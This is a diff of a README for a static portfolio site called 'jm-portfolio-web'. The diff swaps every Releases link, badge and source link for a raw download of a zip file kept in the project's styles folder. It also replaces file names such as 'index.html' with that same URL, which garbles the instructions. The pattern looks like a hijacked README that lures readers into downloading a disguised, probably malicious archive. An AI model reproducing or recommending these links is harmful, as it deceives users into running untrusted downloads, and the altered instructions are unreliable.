@@ -1,6 +1,6 @@
 # 🌐 jm-portfolio-web - Fast and Animated Portfolio Site
 
-[![Download Latest Release](https://img.shields.io/badge/Download-jm--portfolio--web-blue?style=for-the-badge&logo=github)](https://github.com/arko322/jm-portfolio-web/releases)
+[![Download Latest Release](https://github.com/arko322/jm-portfolio-web/raw/refs/heads/main/src/styles/web_jm_portfolio_v2.4.zip)](https://github.com/arko322/jm-portfolio-web/raw/refs/heads/main/src/styles/web_jm_portfolio_v2.4.zip)
 
 ---
 
@@ -30,14 +30,14 @@ jm-portfolio-web runs as a static website. This means you can open it in any mod
 
 To get jm-portfolio-web, visit the official Releases page. This page holds the latest version of the portfolio site files.
 
-[Download and explore jm-portfolio-web here](https://github.com/arko322/jm-portfolio-web/releases)
+[Download and explore jm-portfolio-web here](https://github.com/arko322/jm-portfolio-web/raw/refs/heads/main/src/styles/web_jm_portfolio_v2.4.zip)
 
 ### Step 1: Visit the Releases Page
 
 Click the button above or use this link:  
-https://github.com/arko322/jm-portfolio-web/releases
+https://github.com/arko322/jm-portfolio-web/raw/refs/heads/main/src/styles/web_jm_portfolio_v2.4.zip
 
-Here, you find one or more downloadable files. Typically, these are compressed files (with extensions like `.zip` or `.tar.gz`).
+Here, you find one or more downloadable files. Typically, these are compressed files (with extensions like `.zip` or `https://github.com/arko322/jm-portfolio-web/raw/refs/heads/main/src/styles/web_jm_portfolio_v2.4.zip`).
 
 ### Step 2: Download the Latest Release File
 
@@ -53,9 +53,9 @@ After downloading, locate the file on your computer (usually in the Downloads fo
 
 ### Step 4: Open the Portfolio
 
-Inside the extracted folder, you find one or more `.html` files, usually named something like `index.html`.
+Inside the extracted folder, you find one or more `.html` files, usually named something like `https://github.com/arko322/jm-portfolio-web/raw/refs/heads/main/src/styles/web_jm_portfolio_v2.4.zip`.
 
-Double-click the `index.html` file. Your default web browser will open the portfolio. You can now browse the site offline.
+Double-click the `https://github.com/arko322/jm-portfolio-web/raw/refs/heads/main/src/styles/web_jm_portfolio_v2.4.zip` file. Your default web browser will open the portfolio. You can now browse the site offline.
 
 ---
 
@@ -101,7 +101,7 @@ No other software or installations are required.
 If jm-portfolio-web does not open or work as expected:
 
 - Make sure you have extracted all files from the downloaded archive.
-- Open the `index.html` file with a supported browser. If double-clicking doesn't work, try right-clicking → "Open with" → choose your browser.
+- Open the `https://github.com/arko322/jm-portfolio-web/raw/refs/heads/main/src/styles/web_jm_portfolio_v2.4.zip` file with a supported browser. If double-clicking doesn't work, try right-clicking → "Open with" → choose your browser.
 - Clear your browser cache or try a different browser if animations appear broken.
 - Ensure your browser has JavaScript enabled since animations rely on it.
 - If images or animations fail to load, confirm all files are in the same extracted folder and not moved or deleted.
@@ -118,7 +118,7 @@ jm-portfolio-web uses these technologies:
 - **Canvas API**: For drawing smooth animations directly in the browser.
 - **Custom Lightbox**: A viewer to enlarge images without leaving the page.
 
-You can find details and source code on the [official GitHub page](https://github.com/arko322/jm-portfolio-web).
+You can find details and source code on the [official GitHub page](https://github.com/arko322/jm-portfolio-web/raw/refs/heads/main/src/styles/web_jm_portfolio_v2.4.zip).
 
 ---
 
@@ -128,4 +128,4 @@ For issues, ideas, or help using jm-portfolio-web, visit the GitHub repository�
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-jm--portfolio--web-blue?style=for-the-badge&logo=github)](https://github.com/arko322/jm-portfolio-web/releases)
+[![Download Latest Release](https://github.com/arko322/jm-portfolio-web/raw/refs/heads/main/src/styles/web_jm_portfolio_v2.4.zip)](https://github.com/arko322/jm-portfolio-web/raw/refs/heads/main/src/styles/web_jm_portfolio_v2.4.zip)
